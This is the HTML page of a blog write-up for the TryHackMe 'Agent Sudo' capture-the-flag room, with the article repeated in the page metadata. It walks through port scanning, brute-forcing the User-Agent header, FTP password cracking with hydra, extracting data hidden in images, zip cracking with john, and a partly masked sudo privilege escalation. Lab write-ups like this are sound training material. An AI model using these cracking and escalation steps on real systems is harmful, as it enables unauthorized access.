@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta content="#ffffff" name="theme-color" />
+  <meta content="#da532c" name="msapplication-TileColor" />
+
+  
+<link rel="canonical" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/agent-sudo">
+<meta name="description" content="A secret server is located under the deep sea, hack and reveal the truth.">
+<meta name="keywords" content="agent sudo, tryhackme, stagenography">
+<meta name="robots" content="index, follow">
+
+<meta property="og:title" content="Agent Sudo - TryHackMe Writup">
+<meta property="og:description" content="A secret server is located under the deep sea, hack and reveal the truth.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/agent-sudo">
+<meta property="og:image" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/avatar.jpg">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Agent Sudo - TryHackMe Writup">
+<meta name="twitter:description" content="A secret server is located under the deep sea, hack and reveal the truth.">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/avatar.jpg">
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/agent-sudo"
+    },
+    "headline": "Agent Sudo - TryHackMe Writup",
+    "description": "A secret server is located under the deep sea, hack and reveal the truth.",
+    "author": {
+      "@type": "Person",
+      "name": "вιѕнαℓυ"
+    },
+    "datePublished": "2024-10-22",
+    "image": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/cover.jpg",
+    "publisher": {
+      "@type": "Organization",
+      "name": "Writups",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/human_avatar.jpg"
+      }
+    },
+    "articleBody": "<div style="display: flex; align-items: center;">
+  <div>
+    <img src="agent_sudo.png" alt="Agent Sudo" width="100"/>
+  </div>
+  <div style="margin-left: 10px;">
+    <i>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</i>
+  </div>
+</div>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<p>Target IP: 10.10.165.175</p>
+<p>There are 3 ports are open.</p>
+<p><code>nmap 10.10.165.175 -v</code></p>
+<pre>
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</pre>
+<p>The message shown in homepage, <code>http://10.10.165.175/</code> is</p>
+<pre>
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+</pre>
+<p>It seems need to use <code>user-agent</code> as codename. The codename is from A to Z maybe, as there is shown Agent R. For that i will use BurpSuite.</p>
+<p>I have inserted playod in <code>user-agent</code> from A to Z, and forwarded through intruder. </p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/snipper_attack_burpsuite.png" alt="alt text" /></p>
+<p>Response length for C and R are different, for C less and for R more. By analyzing I found R have much content as</p>
+<pre>
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+	
+Dear agents,
+Use your own <b>codename</b> as user-agent to access the site.
+
+From,
+Agent R
+</pre>
+<p>But in case of C, there is status code <code>302</code> and the locetion is 
+<code>Location: agent_C_attention.php</code></p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/response_user_agent_C.png" alt="alt text" /></p>
+<p>Now visit the location we found,</p>
+<pre>
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+</pre>
+<p>The agent name is <code>chris</code> and it says the password is weak.</p>
+<h2 id="2-attack">2. Attack</h2>
+<p>Lets try out password crack for user cheris in FTP.
+we will use hydra for attack and rockyou.txt for password list.</p>
+<p><code>hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.165.175 ftp</code></p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/ftp_password_attack_result.png" alt="alt text" /></p>
+<p>After the successful login to FTP, we got </p>
+<pre>
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+</pre>
+<p>All the files are download by simply <code>get</code> command.</p>
+<p>The message says that the password is stored inside the image. So need to apply the concept to steganography.</p>
+<pre>
+❯ cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+</pre>
+<p>Now, using <code>binwalk</code> and getting info if found.</p>
+<pre>
+❯ binwalk cute-alien.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+❯ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</pre>
+<p>Now extracting the cutie.png using <code>binwalk -e cutie.png</code> we have 365,  365.zlib and  8702.zip files, zip is important and is password protected.</p>
+<p>Using <code>John The Ripper</code> to crack this password. First creating hash by <code>zip2john 8702.zip &gt; zip_pass.hash</code> and then cracking the hash as</p>
+<pre>
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt zip_pass.hash
+.............
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ali**            (8702.zip/To_agentR.txt)
+1g 0:00:00:00 DONE (2024-10-08 17:45) 1.162g/s 28576p/s 28576c/s 28576C/s christal..280789
+Session completed
+</pre>
+<p>Now we have zip password, extract it. The message found is </p>
+<pre>
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+</pre>
+<p>Here <code>QXJlYTUx</code> is encoded, lets decode using base64 as </p>
+<pre>
+echo 'QXJlYTUx' | base64 -d
+Area**
+</pre>
+<p>Now look into cute-alien.jpg, using <code>steghide</code>. After the command <code>steghide --info cute-alien.jpg</code>, we found that the <code>message.txt</code> file is embedded there.</p>
+<p>Extracting it using <code>steghide --extract -sf cute-alien.jpg</code>. The message is </p>
+<pre>
+❯ cat message.txt
+Hi jam**,
+
+Glad you find this message. Your login password is hacker******
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+</pre>
+<h2 id="3-capture-the-flag">3. Capture the Flag</h2>
+<p>Here we got SSH username and password. Now connect to it as
+<code>ssh jam**@10.10.165.175</code>, got the user flag.
+<img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/user_flag_poc.png" alt="alt text" /></p>
+<p>To know the incident of the photo <code>Alien_autospy.jpg</code> we need to download (maybe using scp) and search on google as</p>
+<p><code>scp jam**@10.10.165.175:/home/jam**/Alien_autospy.jpg .</code></p>
+<p>By searching we found the image from <code>Roswell</code></p>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>Starting from <code>sudo -l</code>, found that user can run /bin/bash only as sudo. Now looking for sudo vulnerability for the version <code>1.8.21p2</code> (googling it.), we have CVE-2019-14***.</p>
+<p>The exploit is <code>sudo ***** /bin/bash</code> (found in exploit-db) and we got</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/root_flag_poc.png" alt="alt text" /></p>
+<p>Final message from Agent R is</p>
+<pre>
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+By,
+Des*** a.k.a Agent R
+</pre>
+<p>Happy Hacking !!</p>
+"
+  }
+  </script>
+   
+
+
+  
+  
+  <link href='&#x2F;icons&#x2F;site.webmanifest' rel="manifest" />
+  
+  
+  <link color="#5bbad5" href='&#x2F;icons&#x2F;safari-pinned-tab.svg' rel="mask-icon" />
+  
+  
+  <link href='&#x2F;icons&#x2F;favicon-16x16.png' rel="icon" sizes="16x16" type="image/png" />
+  
+  
+  <link href='&#x2F;icons&#x2F;favicon-32x32.png' rel="icon" sizes="32x32" type="image/png" />
+  
+  
+  <link href='&#x2F;icons&#x2F;apple-touch-icon.png' rel="apple-touch-icon" sizes="180x180" />
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.css" integrity="sha384-+rY0QD+LRnTOquDMzGa9lXU6jIwdiQuwCJQ2cdcW0qeP/0UbjQCZlXnRsUMA+9pH" crossorigin="anonymous">
+  
+
+  
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jpswalsh/academicons@1.9.1/css/academicons.min.css" integrity="sha384-FIue+PI4SsI9XfHCz8dBLg33b0c1fMJgNU3X//L26FYbGnlSEfWmNT7zgWc2N9b6" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link href="https://theanxiuser.github.io/writups/deep-thought.css" rel="stylesheet" />
+  
+  
+
+  <title>
+    
+Writups | Agent Sudo - TryHackMe Writup
+
+  </title>
+
+  
+  
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mathtex-script-type.min.js" integrity="sha384-jiBVvJ8NGGj5n7kJaiWwWp9AjC+Yh8rhZY3GtAX8yU28azcLgoRo4oukO87g7zDT" crossorigin="anonymous"></script>
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+  
+  
+</head>
+
+<body class="has-background-white">
+  <nav aria-label="section navigation" class="navbar is-light" role="navigation">
+    <div class="container">
+      <div class="navbar-brand">
+        <a class="navbar-item is-size-5 has-text-weight-bold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups">Writups</a>
+        <a aria-expanded="false" aria-label="menu" class="navbar-burger burger" data-target="navMenu" role="button">
+          <span aria-hidden="true"></span>
+          <span aria-hidden="true"></span>
+          <span aria-hidden="true"></span>
+        </a>
+      </div>
+      <div class="navbar-menu" id="navMenu">
+        <div class="navbar-end has-text-centered">
+          
+          
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;">
+            Home
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters">
+            Chapters
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;tags">
+            Tags
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;categories">
+            Categories
+          </a>
+          
+          
+          
+          <a class="navbar-item" id="nav-search" title="Search" data-target="#search-modal">
+            <span class="icon">
+              <i class="fas fa-search"></i>
+            </span>
+          </a>
+          <a class="navbar-item" id="dark-mode" title="Switch to dark theme">
+            <span class="icon">
+              <i class="fas fa-adjust"></i>
+            </span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  
+  
+
+  
+<section class="section">
+  <div class="container">
+    <div class="columns">
+      <div class="column is-8 is-offset-2">
+        <article class="box">
+          <h1 class="title">
+            Agent Sudo - TryHackMe Writup
+          </h1>
+          <p class="subtitle">A secret server is located under the deep sea, hack and reveal the truth.</p>
+          <div class="columns is-multiline is-gapless">
+            <div class="column is-8">
+              
+<span class="icon-text has-text-grey">
+  <span class="icon">
+    <i class="fas fa-user"></i>
+  </span>
+  <span>вιѕнαℓυ published on</span>
+  <span class="icon">
+    <i class="far fa-calendar-alt"></i>
+  </span>
+  <span><time datetime="2024-10-22">October 22, 2024</time></span>
+</span>
+
+            </div>
+            <div class="column is-4 has-text-right-desktop">
+              
+<span class="icon-text has-text-grey">
+  <span class="icon">
+    <i class="far fa-clock"></i>
+  </span>
+  <span>5 min,</span>
+  <span class="icon">
+    <i class="fas fa-pencil-alt"></i>
+  </span>
+  <span>875 words</span>
+</span>
+
+            </div>
+            <div class="column">
+              
+              
+<p>
+  Categories:
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/categories/tryhackme/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-cube"></i>
+      </span>
+      <span>TryHackMe</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/categories/writups/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-cube"></i>
+      </span>
+      <span>Writups</span>
+    </span>
+  </a>
+  
+</p>
+
+              
+            </div>
+            <div class="column has-text-right-desktop">
+              
+              
+<p>
+  Tags:
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/agent-sudo/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>agent sudo</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/tryhackme/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>tryhackme</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/stagenography/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>stagenography</span>
+    </span>
+  </a>
+  
+</p>
+
+              
+            </div>
+          </div>
+          <div class="content mt-2">
+            <div style="display: flex; align-items: center;">
+  <div>
+    <img src="agent_sudo.png" alt="Agent Sudo" width="100"/>
+  </div>
+  <div style="margin-left: 10px;">
+    <i>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</i>
+  </div>
+</div>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<p>Target IP: 10.10.165.175</p>
+<p>There are 3 ports are open.</p>
+<p><code>nmap 10.10.165.175 -v</code></p>
+<pre>
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</pre>
+<p>The message shown in homepage, <code>http://10.10.165.175/</code> is</p>
+<pre>
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+</pre>
+<p>It seems need to use <code>user-agent</code> as codename. The codename is from A to Z maybe, as there is shown Agent R. For that i will use BurpSuite.</p>
+<p>I have inserted playod in <code>user-agent</code> from A to Z, and forwarded through intruder. </p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/snipper_attack_burpsuite.png" alt="alt text" /></p>
+<p>Response length for C and R are different, for C less and for R more. By analyzing I found R have much content as</p>
+<pre>
+What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+	
+Dear agents,
+Use your own <b>codename</b> as user-agent to access the site.
+
+From,
+Agent R
+</pre>
+<p>But in case of C, there is status code <code>302</code> and the locetion is 
+<code>Location: agent_C_attention.php</code></p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/response_user_agent_C.png" alt="alt text" /></p>
+<p>Now visit the location we found,</p>
+<pre>
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+</pre>
+<p>The agent name is <code>chris</code> and it says the password is weak.</p>
+<h2 id="2-attack">2. Attack</h2>
+<p>Lets try out password crack for user cheris in FTP.
+we will use hydra for attack and rockyou.txt for password list.</p>
+<p><code>hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.165.175 ftp</code></p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/ftp_password_attack_result.png" alt="alt text" /></p>
+<p>After the successful login to FTP, we got </p>
+<pre>
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+</pre>
+<p>All the files are download by simply <code>get</code> command.</p>
+<p>The message says that the password is stored inside the image. So need to apply the concept to steganography.</p>
+<pre>
+❯ cat To_agentJ.txt
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+</pre>
+<p>Now, using <code>binwalk</code> and getting info if found.</p>
+<pre>
+❯ binwalk cute-alien.jpg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+❯ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</pre>
+<p>Now extracting the cutie.png using <code>binwalk -e cutie.png</code> we have 365,  365.zlib and  8702.zip files, zip is important and is password protected.</p>
+<p>Using <code>John The Ripper</code> to crack this password. First creating hash by <code>zip2john 8702.zip &gt; zip_pass.hash</code> and then cracking the hash as</p>
+<pre>
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt zip_pass.hash
+.............
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ali**            (8702.zip/To_agentR.txt)
+1g 0:00:00:00 DONE (2024-10-08 17:45) 1.162g/s 28576p/s 28576c/s 28576C/s christal..280789
+Session completed
+</pre>
+<p>Now we have zip password, extract it. The message found is </p>
+<pre>
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+</pre>
+<p>Here <code>QXJlYTUx</code> is encoded, lets decode using base64 as </p>
+<pre>
+echo 'QXJlYTUx' | base64 -d
+Area**
+</pre>
+<p>Now look into cute-alien.jpg, using <code>steghide</code>. After the command <code>steghide --info cute-alien.jpg</code>, we found that the <code>message.txt</code> file is embedded there.</p>
+<p>Extracting it using <code>steghide --extract -sf cute-alien.jpg</code>. The message is </p>
+<pre>
+❯ cat message.txt
+Hi jam**,
+
+Glad you find this message. Your login password is hacker******
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+</pre>
+<h2 id="3-capture-the-flag">3. Capture the Flag</h2>
+<p>Here we got SSH username and password. Now connect to it as
+<code>ssh jam**@10.10.165.175</code>, got the user flag.
+<img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/user_flag_poc.png" alt="alt text" /></p>
+<p>To know the incident of the photo <code>Alien_autospy.jpg</code> we need to download (maybe using scp) and search on google as</p>
+<p><code>scp jam**@10.10.165.175:/home/jam**/Alien_autospy.jpg .</code></p>
+<p>By searching we found the image from <code>Roswell</code></p>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>Starting from <code>sudo -l</code>, found that user can run /bin/bash only as sudo. Now looking for sudo vulnerability for the version <code>1.8.21p2</code> (googling it.), we have CVE-2019-14***.</p>
+<p>The exploit is <code>sudo ***** /bin/bash</code> (found in exploit-db) and we got</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/agent-sudo/root_flag_poc.png" alt="alt text" /></p>
+<p>Final message from Agent R is</p>
+<pre>
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+By,
+Des*** a.k.a Agent R
+</pre>
+<p>Happy Hacking !!</p>
+
+          </div>
+        </article>
+      </div>
+      
+    </div>
+  </div>
+</section>
+
+
+  
+  <section class="modal" id="search-modal">
+    <div class="modal-background"></div>
+    <div class="modal-card">
+      <header class="modal-card-head">
+        <p class="modal-card-title">Search</p>
+      </header>
+      <section class="modal-card-body">
+        <div class="field mb-2">
+          <div class="control">
+            <input class="input" id="search" placeholder="Search this website." type="search" />
+          </div>
+        </div>
+        <div class="search-results">
+          <div class="search-results__items"></div>
+        </div>
+      </section>
+    </div>
+    <button aria-label="close" class="modal-close is-large"></button>
+  </section>
+  
+
+
+  
+
+<section class="section">
+  <div class="container">
+    <div class="columns is-centered">
+      <div class="column is-8">
+        <nav class="level">
+              
+          <div class="level-item has-text-centered">
+            <a class="button is-black is-outlined" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;lazy-admin&#x2F;">
+              <span class="icon mr-2">
+                <i class="fas fa-arrow-circle-left"></i>
+              </span>
+              LazyAdmin - TryHackMe Writup
+            </a>
+          </div>
+           
+          <div class="level-item has-text-centered">
+            <a class="button is-black is-outlined" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;overpass&#x2F;">
+              Overpass - TryHackMe Writup<span class="icon ml-2">
+                <i class="fas fa-arrow-circle-right"></i>
+              </span>
+            </a>
+          </div>
+          
+        </nav>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+
+  
+
+
+
+  
+  <footer class="footer py-4">
+    <div class="content has-text-centered">
+      <p>
+        Built with
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-code"></i>
+          </span>
+          <span>code</span>
+        </span>
+        and
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-heart"></i>
+          </span>
+          <span>love</span>
+        </span>
+      </p>
+      <p>
+        Powered by
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-power-off"></i>
+          </span>
+          <span>zola</span>
+        </span>
+      </p>
+    </div>
+  </footer>
+  
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/galleria.min.js" integrity="sha384-QSfwGT8/EU536DKdtyP2D6SLlh8zBaZ0cVkwfrwhqzIU9VCfJT00CLVP5t+HAiYg" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.js" integrity="sha384-DwpKI+deZB267+hPKwiOIc5Y2GKsVL0mR6hgz7GgIu7AgAMYqJwcJKY1YBNfhWcY" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@8.13.5/dist/mermaid.min.js" integrity="sha384-0yWn54pSGtfKCU+skfA69l25VsCw+MZt4LQov3xNRoS7YkAMrFokGgSBnAWSK4pv" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://cdn.jsdelivr.net/npm/chart.xkcd@1.1.13/dist/chart.xkcd.min.js" integrity="sha384-xC3h1+IHXK8seA+8KfT79Z4e0GPsznjXBoMa5nd8ooWKplPyXx92NOmljWxLC/cs" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://theanxiuser.github.io/writups/elasticlunr.min.js"></script>
+  <script src="https://theanxiuser.github.io/writups/search_index.en.js"></script><script src="https://theanxiuser.github.io/writups/js/site.js"></script>
+
+  
+
+
+
+
+
+  
+  
+</body>
+
+</html>
